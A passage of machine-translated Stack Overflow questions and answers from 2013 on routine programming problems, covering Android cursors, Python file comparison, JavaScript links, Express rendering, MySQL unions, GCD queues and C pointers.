        }
        c.close();
        return null;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:10:07.353

> 02-13 11:37:52.013: E/AndroidRuntime(287): android.database.StaleDataException: 访问关闭游标

您的问题是您正在尝试访问已关闭的数据`Cursor`。这是不允许的，因此删除行，`c.close()`现在它应该可以工作了。

**注意：**一般建议关闭任何游标、数据源`onPause()`或`onDestroy()`方法。

**更新：** 这里是编辑过的方法，复制粘贴再试一次。它应该有效。

```
public Cursor getItems() {
   String [] columns = new String[] {KEY_ROWSHOPID, KEY_ITEMSHOP, KEY_ITEMNUM, 
                                     KEY_ITEMPRICE};
   Cursor c = ourDatabase.query(DATABASE_TABLESHOP, columns, null, null, null,
                                null, null);
   if (c.moveToFirst()) {
      return c;
   }
   return null;
}

public void onDestroy() {
   super.onDestroy();
   closeSources();
}

private void closeSources() {
   if (c != null) {
      c.close();
   }
   if (db != null) {
      db.close();
   }
} 
```

# objective-c - 网络活动指示器和异步套接字

> ID：14853186
> 
> 赞同：1
> 
> 时间：2013-02-13T12:05:25.013
> 
> 标签：objective-c, sockets, networking, nonblocking

我有一个应用程序，它不断地从服务器连接读取状态更新。

一切都与流委托一起工作得很好，以异步处理所有读取和写入。

应用程序中没有任何部分“等待”来自服务器的特定响应，它只是不断地处理状态更新，因为它们偶尔会从套接字到达。客户端没有等待响应的请求。

我想知道在这种情况下，网络活动指示器的最佳做法是什么。

我可以在流事件处理程序中打开它，然后在我们离开处理程序之前关闭它，但这将是一个非常短的时间（刚好足以发生非阻塞读取或写入）。尝试这个，我只看到指示器最微弱的闪烁；它需要比仅在事件处理程序期间更长的时间。

在流委托中打开它，然后设置一个计时器在短时间内关闭它呢？（这将确保它有足够长的时间被看到，而不是在流代理中花费的时间很短。）

注意：我已经尝试过最后一个想法：只要有流活动就打开网络活动指示器，并注意 NSDate；然后在计时器（我每 1 秒触发一次）中，如果经过的时间大于 0.5 秒，我会关闭指示器。这似乎给出了网络活动的合理指示。

有更好的推荐吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:36:34.250

如果网络活动是连续的，那么听起来它可能会让用户有些恼火，特别是如果它一直在打开和关闭。

也许更好的方法是测试在某个超时值之前是否*缺少响应，然后如果您没有从服务器获得任何响应，则向用户显示警报视图。*如果您可以向用户提供反馈（例如“上次更新：5 分钟前”），那么即使这也是可选的。

# python - 如何在python中有效地迭代两个文件？

> ID：14853188
> 
> 赞同：4
> 
> 时间：2013-02-13T12:05:29.730
> 
> 标签：python, performance, file, duplicates

我有两个文本文件，它们应该有很多匹配的行，我想知道文件之间有多少行匹配。问题是这两个文件都很大（一个文件大约 3gb，另一个文件超过 16gb）。所以很明显，使用 read() 或 readlines() 将它们读入系统内存可能会有很大问题。有小费吗？我正在编写的代码基本上只是一个 2 个循环和一个用于比较它们的 if 语句。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:17:11.900

由于输入文件非常大，如果您关心性能，您应该考虑简单地使用`grep -f`. 该`-f`选项从文件中读取模式，因此根据您所追求的确切语义，它可能会满足您的需求。你可能也想要这个`-x`选项，只接受整行匹配。所以 Python 中的整个事情可能看起来像这样：

```
child = subprocess.Popen(['grep', '-xf', file1, file2], stdout=subprocess.PIPE)
for line in child.stdout:
    print line 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:29:29.527

为什么不使用unix `grep`？如果您希望您的解决方案平台独立，那么此解决方案将不起作用。但是在unix中它可以工作。从您的 python 脚本运行此命令。

```
grep --fixed-strings --file=file_B file_A > result_file 
```

此外，这个问题似乎是使用 map-reduce 的一个很好的理由。

**更新0：**阐明。`--fixed-strings = Interpret PATTERN as a list of fixed strings, separated by newlines, any of which is to be matched.`和`--file= Obtain patterns from FILE, one per line.`

所以我们正在做的是从`file_B`匹配的内容中获取模式`file_A`，并将`fixed-strings`它们视为一系列模式，就像它们在文件中的方式一样。希望这能让它更清楚。

由于您想要匹配行的计数，因此对上面的内容进行了轻微修改，`grep`我们得到了计数 -

```
grep --fixed-strings --file=file_B file_A | wc -l 
```

**更新1：**你可以这样做。首先逐行浏览每个文件。不要将整个文件读入内存。当您读取一行时，计算该行的 md5 哈希并将其写入另一个文件。当你对这 2 个文件执行此操作时，你会得到 2 个填充了 md5 哈希的新文件。我希望这两个文件的大小比原始文件小得多，因为 md5 是 16 字节，与 i/p 字符串无关。现在您可能可以执行 grep 或其他差异技术，而几乎没有或没有内存问题。– Srikar 3 分钟前 编辑

**更新2：（几天后）**你能做到吗？`table1, table2`在mysql中创建2个表。两者都只有 2 个字段`id, data`。将这两个文件逐行插入这两个表中。之后运行查询以查找重复项的数量。您必须浏览这两个文件。那是给定的。我们不能逃避这个事实。现在可以在如何找到 dup 方面进行优化。MySQL 就是这样一种选择。它消除了许多您需要做的事情，例如 RAM 空间、索引创建等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T17:21:16.767

谢谢大家的意见！但我最终做的事情非常简单。我正在尝试这样的事情，它读入整个文件。

```
file = open(xxx,"r")
for line in file:
      if..... 
```

我最终做的是

```
for line in open(xxx)
    if..... 
```

第二个逐行获取文件。这非常耗时，但我几乎接受了没有什么神奇的方法可以做到这一点，只需要很少的时间:(

# javascript - 通过JS转到另一个html文件

> ID：14853189
> 
> 赞同：0
> 
> 时间：2013-02-13T12:05:32.367
> 
> 标签：javascript, html, anchor

我有一个

```
<a href= ./index2.html> 
```

我的 index.html 中的按钮，但现在我想更改它，以便在单击它时它也会调用一个函数，所以我尝试了

```
<a href="./index2.html;javascript:randomFunction();" 
```

但它不起作用，我怎样才能让一个元素使切换html页面并立即调用一个函数？谢谢！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:08:05.387

**假设要在当前页面运行 JS：**

您不应该使用的快速而肮脏的方法是添加`onclick`属性。

```
<a href="index2.html" onclick="randomFunction()"> 
```

干净的方法是[将事件处理程序](https://developer.mozilla.org/en/docs/DOM/element.addEventListener)与 JS 绑定。

```
reference_to_anchor.addEventListener('click', randomFunction); 
```

（有关详细信息以及在旧版本的 IE 中缺乏支持的解决方法，请参阅上面链接的文档）。

（另请参阅[渐进式增强](http://en.wikipedia.org/wiki/Progressive_enhancement)和[不显眼的 JavaScript](http://en.wikipedia.org/wiki/Unobtrusive_JavaScript)）。

这将在链接出现之前在链接出现的页面上运行 JavaScript。

**另一方面，如果您希望 JavaScript 在目标页面上运行：**

你有一个相当复杂的问题要处理。

一个新的页面意味着一个新的执行环境。一个页面上的客户端代码不能触发下一个页面上的客户端代码。

如果 URI 上存在特定的查询字符串，我会通过生成并包含服务器端脚本来解决*该问题。*`index2``<script>randomFunction();</script>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:07:41.270

让它通过`onclick`事件调用所需的函数，在函数结束时执行：

```
window.location=url; 
```

或者，如果您想更改页面，然后在新页面上调用函数，请使用普通`a`标签转到新页面，然后：

```
window.onload=function(){
     //do something
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:07:56.127

您可以使用`onclick="javascript:randomFunction()"`

例如：

```
<a href="./index2.html" onclick="randomFunction()"> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:08:40.870

使用 onclick 事件调用函数

```
<a href="index2.html" onclick="javascript:randomFunction();"></a> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:09:34.607

你可以使用`onclick`javascript的事件。

```
<a href="./index2.html" onclick="return randomFunction();"></a> 

function randomFunction(){
   // do needfull code here.
} 
```

# jsf - Spring Roo JSF：reCaptcha 未显示在对话框中

> ID：14853192
> 
> 赞同：1
> 
> 时间：2013-02-13T12:05:37.143
> 
> 标签：jsf, primefaces, spring-roo, recaptcha

我尝试在 Roo 生成的 xhtml 中添加 recaptcha：

```
<p:dialog id="createDialog" header="#{messages.label_create} Person" modal="true" widgetVar="createDialogWidget" dynamic="true" visible="#{personBean.createDialogVisible}" resizable="true" maximizable="true" showEffect="fade" hideEffect="explode">
  <p:ajax event="close" update=":dataForm:data" listener="#{personBean.handleDialogClose}" />
  <p:outputPanel id="createPanel">
    <h:form id="createForm" enctype="multipart/form-data">
      <h:panelGrid id="createPanelGrid" columns="3" binding="#{personBean.createPanelGrid}" styleClass="dialog" columnClasses="col1,col2,col3" />

      <p:captcha id="createReCaptcha" theme="white"/>

      <p:commandButton id="createSaveButton" value="#{messages.label_save}" action="#{personBean.persist}" update="createPanelGrid :growlForm:growl" />
      <p:commandButton id="createCloseButton" value="#{messages.label_close}" onclick="createDialogWidget.hide()" type="button" />
    </h:form>
  </p:outputPanel>
</p:dialog> 
```

并且没有显示recaptha....我错在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T09:01:42.237

从您的 p:dialog 中删除 dynamic="true"

# javascript - 如何实际拦截 res.render

> ID：14853196
> 
> 赞同：1
> 
> 时间：2013-02-13T12:05:51.157
> 
> 标签：javascript, node.js, express

我想拦截每个渲染调用，做我自己的事情，然后继续使用原始渲染方法。我知道这可以通过这样的中间件轻松完成：

```
function (req, res, next) {
  var _render = render;
  res.render = function () {
    // custom stuff
    _render.apply(this, arguments);
  }
  next();
} 
```

但是，仅更改响应对象的原型而不是在每个请求上替换 res.render 似乎更有效。我尝试[了这样的解决方案](https://stackoverflow.com/questions/9285880/node-js-express-js-how-to-override-intercept-res-render-function#answer-9294574)，但没有成功。记录`http.ServerResponse.prototype`时没有任何渲染方法的痕迹。

最后，我尝试截取 app.render，如下所示：

```
var _render = app.render;
app.render = function () {
  // this is refering to app instead of res...
  _render.apply(this, arguments);
} 
```

这确实符合我只执行一次的标准，**但**它是在 app 对象而不是 res 对象上调用的，这意味着我无法访问 res 或 req 对象。

基本上我想我想做的是：

```
var _render = something.response.render;
something.response.render = function (view, data, callback) {
  // Access res.*, as this.*
  _render.call(this, view, data, callback);
}; 
```

任何想法如何实现这一目标？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:48:33.543

我想这取决于 Express 版本。试试这个 3.x：

```
var response = require( "express" ).response;

var _render = response.render;
response.render = function( ) {
    // do your stuff
    _render.apply( this, arguments );
}; 
```

# mysql - 如何将 2 个数据库结果合并在一列中

> ID：14853203
> 
> 赞同：0
> 
> 时间：2013-02-13T12:06:07.077
> 
> 标签：mysql, sql

我有2列如下：

```
A  |  B
---|---
7  |  1
7  |  2
3  |  7
4  |  5
------- 
```

**我想得到 1 列包含 (1,2,3)。**

目前我正在查询这个：

```
SELECT  `A` ,  `B` 
FROM  `mytable` 
WHERE  `A` =7
OR  `B` =7 
```

但我在 A 和 B 两边都有 2 列包含数字 7。

*我确定有办法得到我想要的，但我不知道如何用谷歌搜索！！*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:10:50.970

你可以使用这个：

```
SELECT
  case when A=7 then B else A end
FROM
  yourtable
WHERE
  7 IN (A, B) 
```

如果你想要一个单列，你可以使用这个：

```
SELECT
  GROUP_CONCAT(case when A=7 then B else A end
               ORDER BY case when A=7 then B else A end)
FROM
  yourtable
WHERE 7 IN (A, B) 
```

[在这里](http://sqlfiddle.com/#!2/a705d/5)看小提琴。

如果 A 和 B 的值可以同时为 7，并且您想跳过该行，则可以替换：

```
WHERE 7 IN (A, B) 
```

和

```
WHERE A=7 XOR B=7 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:08:44.577

不太确定你需要什么，但我猜是这样的：

```
SELECT A FROM mytable WHERE B=7
UNION
SELECT B FROM mytable WHERE A=7 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:34:59.373

我想你在找这个

```
 SELECT myresult from (

          SELECT A myresult FROM Table1 WHERE A IN (1,2,3)
          UNION
          SELECT B myresult FROM Table1 WHERE B IN (1,2,3)
                   )t
   ORDER BY myresult 
```

这将输出：

```
 MYRESULT
   1
   2
   3 
```

[**SQL 演示在这里**](http://sqlfiddle.com/#!2/4e29f/9)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:27:42.390

如果您期望结果为 1、2、3，请使用以下内容。

```
SELECT colB as NewCol FROM tableName WHERE colA=7
UNION
SELECT colA as NewCol FROM tableName WHERE colB=7; 
```

如果您想要两列只需使用

```
SELECT colA, colB FROM tableName WHERE colA=7 OR colB=7; 
```

## [在 sqlfiddle 演示](http://sqlfiddle.com/#!2/e0209/8)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:16:57.547

尝试这个

```
SELECT A as Single FROM mytable WHERE B=7   UNION   
SELECT B  as Single FROM mytable WHERE A=7 ORDER BY Single; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-13T13:04:32.223

你必须试试这个代码..

```
SELECT b as value FROM users WHERE a='7'
UNION All
SELECT a as value FROM users WHERE b='7' 
```

此查询必须对您有所帮助。

# jms - jdeveloper 11g 中的 JNDI 和 JMS

> ID：14853205
> 
> 赞同：0
> 
> 时间：2013-02-13T12:06:20.213
> 
> 标签：jms, jndi, weblogic11g

我正在尝试将 JMS 应用程序从 OAS 10.1.2 启动到 BeaWebLogic 11g，但在定位 JMS JNDI 时出现问题。当我启动服务器时，会引发此异常：

```
 weblogic.application.ModuleException: Could not setup environment
        at weblogic.servlet.internal.WebAppModule.activateContexts(WebAppModule.java:1495)
        at weblogic.servlet.internal.WebAppModule.activate(WebAppModule.java:438)
        at weblogic.application.internal.flow.ModuleStateDriver$2.next(ModuleStateDriver.java:375)
        at weblogic.application.utils.StateMachineDriver.nextState(StateMachineDriver.java:52)
        at weblogic.application.internal.flow.ModuleStateDriver.activate(ModuleStateDriver.java:95)
        Truncated. see log file for complete stacktrace
    Caused By: javax.naming.NamingException: Cannot bind null object to jndi with name jms/TopicJNDI
        at weblogic.jndi.internal.BasicNamingNode.bind(BasicNamingNode.java:311)
        at weblogic.jndi.internal.WLEventContextImpl.bind(WLEventContextImpl.java:277)
        at weblogic.deployment.EnvironmentBuilder.addConnectorRef(EnvironmentBuilder.java:277)
        at weblogic.deployment.EnvironmentBuilder.addResourceReferences(EnvironmentBuilder.java:169)
        at weblogic.servlet.internal.CompEnv.activate(CompEnv.java:138)
        Truncated. see log file for complete stacktrace 
```

我在 BWL 控制台中映射的 jndi 是 jms/Topic。

我在服务器启动时收到此错误：

```
 <An entity of type "ConnectionFactories" withname "Demo Topic Connection Factory" in JMS module "jmsModule" is not targeted. There is no sub-deployment with name "Demo Topic Connection Factory" in the configuration repository (config.xml), and so this entity will not exist anywhere in the domain.> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-14T14:56:04.703

我的问题的答案在[这里](https://forums.oracle.com/forums/thread.jspa?threadID=1058956)

> 这是我如何让它工作的。
> 
> 将以下行添加到 weblogic.xml 文件。
> 
> ```
> <resource-description>
> <res-ref-name>MyDataSourceRefName<res-ref-name>
> <jndi-name>jdbc/MyDataSourceNameAsDefinedInWeblogic</jndi-name>
> </resource-description> 
> ```
> 
> 然后将以下内容添加到您的 web.xml 文件中
> 
> ```
> <resource-ref>
> <description>Some description</description>
> <res-ref-name>MyResourceRefName</res-ref-name>
> <res-type>javax.sql.Datasource</res-type>
> <res-auth>Container</res-auth>
> </resource-ref> 
> ```
> 
> 在我这样做之后，一切正常。此外，如果您尝试将 Spring 配置为使用此数据源，请添加以下 bean。
> 
> ```
> <bean id="dataSource" class="org.springframework.jndi.JndiObjectFactoryBean">
> <property name="jndiName">
> <value>MyDataSourceRefName</value>
> </property>
> </bean> 
> ```
> 
> 然后使用你的数据源一个合适的。我希望这有帮助。

# iphone - GCD流程怎么写

> ID：14853211
> 
> 赞同：-4
> 
> 时间：2013-02-13T12:06:43.910
> 
> 标签：iphone, ios, objective-c, ipad, grand-central-dispatch

我正在尝试在视频开始播放时制作 avplayer 的屏幕截图，所以我需要在后台快速运行此代码，这样它不会阻塞主线程和其他控件同时快速运行，尝试运行该代码 GCD 格式我无法运行请帮我这样做，它停在我添加到数组中的位置（在数组中我正在添加 UIImage 对象）...

```
if (isCaptureScreenStart)
{
    if (CMTimeGetSeconds([avPlayer currentTime])>0)
    {
        if (avFramesArray!=nil)
        {
            queue = dispatch_queue_create("array", NULL);
            dispatch_sync(queue, ^{
                [avFramesArray addObject:[self screenshotFromPlayer:avPlayer maximumSize:avPlayerLayer.frame.size :CMTimeGetSeconds([avPlayer currentTime])]];//stop at this line
                NSLog(@"count:%d",[avFramesArray count]);
                dispatch_sync(dispatch_get_main_queue(), ^{
                    NSLog(@"Frame are created:%d",[avFramesArray count]);
                    if ([avFramesArray count]==0)    
                    {
                        NSLog(@"Frame are over");
                    }
                });
            });
        }
    }
}
dispatch_release(queue); 
```

* * *

编辑：

我想我现在需要使用`dispatch_group_async`这个块..请给出一些如何使用的指南：

```
if (isCaptureScreenStart)
{
    if (CMTimeGetSeconds([avPlayer currentTime])>0)
    {
        if (avFramesArray!=nil) {
            dispatch_group_async(serial_group1, serial_dispatch_queue1, ^{
                [avFramesArray addObject:[self screenshotFromPlayer:avPlayer maximumSize:avPlayerLayer.frame.size :CMTimeGetSeconds([avPlayer currentTime])]];
            });
        }
    }
    dispatch_group_notify(serial_group1, serial_dispatch_queue1, ^{
        NSLog(@"task competed");
    });
} 
```

现在我正在使用这个块，但上面的执行是有争议的运行，如果我使用`dispatch_suspend(serial_dispatch_queue1);`它的停止但我需要再次开始块执行，那么我需要使用什么我也尝试`dispatch_resume(serial_dispatch_queue1);`再次加载但系统显示我崩溃

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:11:07.230

`dispatch_release(queue);`不要在那里做，你调用它的调度队列去一个backThread，所以发生的事情是：-

> 您的队列在代码块执行之前被释放。

因为你`queue`看起来像一个 ivar，所以在 dealloc 中释放它。休息一下，你的代码看起来不错..在里面放一个断点并检查块是否正在执行。

**编辑**

我不明白，你试图通过暂停队列来实现什么，没有必要这样做。您不需要检查块是否已完成执行。该块将完成，然后调用`dispatch_async`，获取主队列并从那里更新 UI。

现在，当您创建队列时，在您的方法中懒惰地创建它。将队列作为头文件中的 ivar：

```
@interface YourFileController : UIViewController {
    dispatch_queue_t queue;
} 
```

然后在你的方法中修改它：

```
if (isCaptureScreenStart)
{
    if (CMTimeGetSeconds([avPlayer currentTime])>0)
    {
        if (avFramesArray!=nil)
        {
            if (!queue)
                queue = dispatch_queue_create("array", DISPATCH_QUEUE_SERIAL);

            dispatch_sync(queue, ^{
                [avFramesArray addObject:[self screenshotFromPlayer:avPlayer maximumSize:avPlayerLayer.frame.size :CMTimeGetSeconds([avPlayer currentTime])]];//stop at this line
                NSLog(@"count:%d",[avFramesArray count]);
                dispatch_sync(dispatch_get_main_queue(), ^{
                    NSLog(@"Frame are created:%d",[avFramesArray count]);
                    if ([avFramesArray count]==0)    
                    {
                        NSLog(@"Frame are over");
                    }
                });
            });
        }
    }
} 
```

**注意**：`DISPATCH_QUEUE_SERIAL`创建一个串行队列，这意味着提交给它的所有块都将以先进先出的顺序串行执行。一旦所有提交的块都被执行，队列就会停留;) ..向它提交另一个块并执行块：D

这代表一整块：-

```
[avFramesArray addObject:[self screenshotFromPlayer:avPlayer maximumSize:avPlayerLayer.frame.size :CMTimeGetSeconds([avPlayer currentTime])]];//stop at this line
                NSLog(@"count:%d",[avFramesArray count]);
                dispatch_sync(dispatch_get_main_queue(), ^{
                    NSLog(@"Frame are created:%d",[avFramesArray count]);
                    if ([avFramesArray count]==0)    
                    {
                        NSLog(@"Frame are over");
                    }
                }); 
```

# php - 无法删除 使用PHP从字符串中提取html标签

> ID：14853213
> 
> 赞同：0
> 
> 时间：2013-02-13T12:06:52.967
> 
> 标签：php

我有一个奇怪的场景，我就是无法理解

从 PHP 中的字符串中删除的标签。

这就是发生的事情，我正在使用编码 ASCII 从数据库中提取数据

字符串看起来像这样

```
&lt;p&gt;Blue Power Waterproof&lt;/p&gt; 
```

现在我执行以下操作来解码实体

```
html_entity_decode($p->description) 
```

以下结果`<p>Blue Power Waterproof</p>`我需要删除

标签，但以下不起作用

```
strip_tags(html_entity_decode($p->description)) 
```

和`removeParagraphTags(html_entity_decode($p->description);`

```
function removeParagraphTags($html){ 
            $pattern = "'#<p[^>]*>(\s|&nbsp;?)*</p>#'"; 
            iconv(mb_detect_encoding($html, "auto"), 'UTF-8', $html);
            return preg_replace($pattern, '', $html); 
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-19T12:07:06.937

我通过从与 HTML 实体一起存储的数据库中获取所有描述来解决这个问题，解码实体以便将实体转换为 html，然后用 html 而不是实体更新每条记录，这解决了问题

```
$sql = "SELECT * FROM products";
$result=  pg_query($conn,$sql);
while ($row = pg_fetch_array($result,null,PGSQL_ASSOC)) {
    $name = html_entity_decode($row['name']);
    $name = iconv('UTF-8', 'ASCII', $name);
    $desc = html_entity_decode($row['description']);
    $desc = iconv('UTF-8', 'ASCII', $desc);
    $ldesc = html_entity_decode($row['longDescription']);
    $ldesc = iconv('UTF-8', 'ASCII', $ldesc);
    $up = "UPDATE products SET name='".pg_escape_string($name)."',description='".  pg_escape_string($desc)."',\"longDescription\"='".pg_escape_string($ldesc)."' WHERE p_id=".$row['p_id'];

    pg_query($conn,$up) OR die(pg_last_error());
} 
```

# javascript - 复制我的标题信息的 Javascript 文件“FASW 转换”。怎么修

> ID：14853219
> 
> 赞同：0
> 
> 时间：2013-02-13T12:07:28.463
> 
> 标签：javascript, jquery, html, wordpress, css

好的！我在一个 wordpress 网站上工作，这个 javascript 添加的所有东西都应该做，它确实......但是，当我通过 safari develop 检查元素时，我注意到它正在加载我所有的标题脚本、元、样式等. 进入身体和头部。我不知道为什么。脚本如下所示：

```
function ft(params) {

var ol= document.addEventListener?"DOMContentLoaded":"load"; //on load event
var navB = params.navB || "reverse slide"; //backbrowser button effect, default empty
var but = params.but || false; //Allow transitions on input type button
var cBa = params.cBa || function() {};

function aDL(url, t, o) {   //Ajax Div Load
  if (window.XMLHttpRequest) {
    r = new XMLHttpRequest();
  } else if (window.ActiveXObject) {
    r = new ActiveXObject("Microsoft.XMLHTTP");
  }
  if (r != undefined) {
    r.onreadystatechange = function() {Ol(r, t, o);};
    r.open("GET", url, true);
    r.send("");
  }
}  
function Ol(r, t, o) {  //On load div
  if (r.readyState == 4) { 
    if (r.status == 200 || r.status == 0) { 
      t.innerHTML = r.responseText;
      o();
    } else {
      t.innerHTML="Error:\n"+ r.status + "\n" +r.statusText;
    }
  }
}

    function DE()       //Div Effect
{
var dochtml = document.body.innerHTML;
document.body.innerHTML = "";
var d1 = document.createElement("div");
d1.id = "d1";
d1.style.zIndex = 2;
d1.style.position = "absolute"; 
d1.style.width = "100%"; 
d1.style.height = "100%"; 
d1.style.left = "0px"; 
d1.style.top = "0px";
document.body.appendChild(d1);
d1.innerHTML = dochtml;
var d2 = document.createElement("div");
d2.id = "d2";
d2.style.zIndex = 1;
d2.style.position = "absolute"; 
d2.style.width = "100%"; 
d2.style.height = "100%"; 
d2.style.left = "0px"; 
d2.style.top = "0px";
document.body.appendChild(d2);
return {d1: d1, d2: d2 };
}

function timeOuts(e, d1,d2)
{
setTimeout(function() { d1.className = e + " out"; }, 1);
setTimeout(function() { d2.className = e + " in"; }, 1);
setTimeout(function() { 
    document.body.innerHTML = d2.innerHTML;
    cBa();
}, 706);
}

function slideTo(href, effect, pushstate)
{
var d = DE();
var d1 = d.d1;
var d2 = d.d2;
aDL(href, d2, 
function() {
if (pushstate && window.history.pushState) window.history.pushState("", "", href);
            timeOuts(effect,d1,d2);
        }
);
}
function dC(e){ //Detect click event
var o;
var o=e.srcElement || e.target;
var tn = o.tagName.toLowerCase();
if (!but || tn!="input" || o.getAttribute("type")!="button")    //if it is not a button
{
    //try to find an anchor parent
    while (tn!=="a" && tn!=="body")
    {
        o = o.parentNode;
        tn = o.tagName.toLowerCase();
    }
    if (tn==="body") return;
}
var t = o.getAttribute("data-ftrans");
if (t) 
{
    e.preventDefault();
    var hr = o.getAttribute("href") || o.getAttribute("data-href");
    if (hr) slideTo(hr, t, true);
}
}
function aE(ev, el, f) {  //Add event
if (el.addEventListener)  // W3C DOM
    el.addEventListener(ev,f,false);
else if (el.attachEvent) { // IE DOM
     var r = el.attachEvent("on"+ev, f);
     return r;
}
}
aE("click", window, dC);

aE(ol, document,        //On load
function(ev)
{
aE("popstate", window, function(e) {    //function to reload when back button   is clicked
        slideTo(location.pathname, navB, false);
});
}

);

} 
```

这是该网站的链接：http: [//www.fasw.ws/faswwp/non-jquery-page-transitions-lightweight/](http://www.fasw.ws/faswwp/non-jquery-page-transitions-lightweight/)

我认为那不应该发生。所以我试图弄清楚如何保持干净，并保持头部文件加载在头部，并且只加载页面内容。我无法弄清楚这一点，需要专业人士的帮助:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-03T04:13:57.413

FASW 带有两个函数，它们在初始化组件之前和之后都充当“钩子”。你可以这样做：

```
(function inittrans() 
{
    initComponents();
    var params = { /*put your options here*/ };
    new ft(params);
})();

function onTransitionFinished()
{
    initComponents();
}

function initComponents() {
    // here is where you put your "other" javascript codes
} 
```

请注意在加载初始页面后以及在转换发生后再次执行您的 javascript 代码的方式。无论如何，这就是我解决它的方法，因为 FASW 通过 Ajax on-the-fly 加载它们时，javascript 代码无法正常工作。

# python - Python - 将浮点字符串解析为整数

> ID：14853220
> 
> 赞同：2
> 
> 时间：2013-02-13T12:07:29.613
> 
> 标签：python, math

我想将“0.75”之类的字符串转换为 3/4。python是否有任何内置函数。

我知道我可以使用 float("0.75") 将其转换为浮点值。但我只需要整数而不失去分辨率。

我可以写一个函数，比如将它乘以 100，所以我会得到 75/100，但仍然如何计算到 3/4。任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:09:18.073

```
>>> from fractions import Fraction
>>> Fraction(0.75)
Fraction(3, 4) 
```

请参阅[文档](http://docs.python.org/2/library/fractions.html)。

一个警告：非二进制分数（即从[无法以二进制精确表示的浮点数](http://docs.python.org/2/tutorial/floatingpoint.html)得出的分数，例如`0.9`）可能会产生令人惊讶的结果，除非您传递 的字符串表示形式`float`：

```
>>> Fraction(0.9)
Fraction(8106479329266893, 9007199254740992)
>>> Fraction("0.9")
Fraction(9, 10) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:09:05.197

Python 有[分数](http://docs.python.org/2/library/fractions.html)模块。

```
>>> import fractions
>>> fractions.Fraction('0.75')
Fraction(3, 4) 
```

# c - C 中不兼容的指针类型。我们什么时候使用 * 或 &？引用指针的概念有问题

> ID：14853223
> 
> 赞同：0
> 
> 时间：2013-02-13T12:07:34.197
> 
> 标签：c, pointers

我在使用指针时遇到问题。我知道我应该去上班时间，但我迫切需要帮助。现在最大的问题是试图调试这个程序。据我了解，我应该在我的 void 函数中声明一个地址。之后，我必须将 & 用于 readfile(%testarray)。我究竟做错了什么？我的程序的目标是读取一个数字文件并将它们存储在一个数组中。然后，我将打印数组中的所有数字。任何帮助将不胜感激。

```
sort.c:11:3: warning: passing argument 1 of 'read_file' makes pointer from integer without a cast [enabled by default]
sort.c:3:6: note: expected 'int **' but argument is of type 'int'
sort.c: In function 'read_file':
sort.c:27:3: warning: format '%d' expects argument of type 'int *', but argument 3 has type 'int' [-Wformat] 
```

代码：

```
 #include <stdio.h>
    #include <stdlib.h>
    void read_file(int* myList[]);

    int main()
    {
      int testarray[20];
      read_file(&testarray[20]);
      return 0;
    }

    void read_file(int* myList[])
    {
      FILE* inFile;
      int i;
      inFile = fopen("data.txt","r");
      if (inFile == NULL)
      {
        printf("Unable to open file");
        exit(1);
      }
        i = 0;
        while (fscanf(inFile,"%d", *myList[i]) != EOF)
      {
        printf("%d ", *myList[i]);
        i = i+1;
      }
      printf("\n");
      printf("%d\n", i );
     } //void 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:16:49.950

当您`[]`在函数头中的名称后使用方括号时，您告诉编译器您正在传递一个数组。

*   `int testarray[]`表示整数数组
*   `int *testarray[]`*表示整数指针*数组

 *由于您传递了一个整数数组，因此函数签名应该是

```
void read_file(int myList[]); 
```

或其等价物

```
void read_file(int *myList); 
```

调用应如下所示：

```
read_file(testarray); 
```

接下来，关于`&`vs.的主题`*`：＆符号从具有地址的值表达式中生成指针，而星号从指针表达式中生成值。`scanf`需要一个指针，所以你需要调用它

```
fscanf(inFile,"%d", &myList[i]) 
```

或同等的

```
fscanf(inFile,"%d", myList+i) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:14:23.707

这是您的固定代码。

```
#include <stdio.h>
#include <stdlib.h>

void read_file(int myList[20]);

int main()
{
    int testarray[20];
    read_file(testarray);
    return 0;
}

void read_file(int myList[20])
{
    FILE* inFile;
    int i;
    inFile = fopen("data.txt","r");
    if (inFile == NULL)
    {
        printf("Unable to open file");
        exit(1);
    }
    i = 0;
    while (fscanf(inFile,"%d", &myList[i]) != EOF)
    {
        printf("%d ", myList[i]);
        i = i+1;
    }
    printf("\n");
    printf("%d\n", i );
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:53:15.753

假设文本文件中有 10 个数字，请参考以下代码：

```
 #include <stdio.h>
    #include <stdlib.h>
    void read_file(int *);

    int main()
    {
     int *List=(int *)malloc(10*sizeof(int));// Allocate memory for 10 integers
     read_file(List); 
     return 0;
    }

/* Passing a pointer to the contiguous locations, just the starting location is enough*/
    void read_file(int *ptr)
    {
     FILE *inFile;
     inFile=fopen("Numbers.txt","r");
     int i=0;
     if(inFile!=NULL)
      while(fscanf(inFile,"%d",ptr)!=EOF)
      {    
